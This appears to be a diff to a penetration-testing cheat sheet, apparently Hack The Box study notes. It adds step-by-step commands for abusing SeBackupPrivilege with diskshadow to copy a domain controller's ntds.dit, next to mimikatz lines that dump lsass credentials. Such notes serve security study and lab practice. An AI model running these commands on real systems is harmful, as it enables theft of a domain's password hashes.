@@ -849,6 +849,34 @@ mimikatz # sekurlsa::minidump lsass.dmp
 mimikatz # sekurlsa::logonpasswords
 ```
 
+### SeBackupPrivilege
+
+```
+- You can login to DC and get ntds.dit
+
+PS C:\htb> Set-SeBackupPrivilege
+
+PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
+PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
+
+PS C:\htb> diskshadow.exe
+
+DISKSHADOW> set verbose on
+DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW> set context clientaccessible
+DISKSHADOW> set context persistent
+DISKSHADOW> begin backup
+DISKSHADOW> add volume C: alias cdrive
+DISKSHADOW> create
+DISKSHADOW> expose %cdrive% E:
+DISKSHADOW> end backup
+DISKSHADOW> exit
+
+
+PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
+
+```
+
 ### UAC
 
 ```
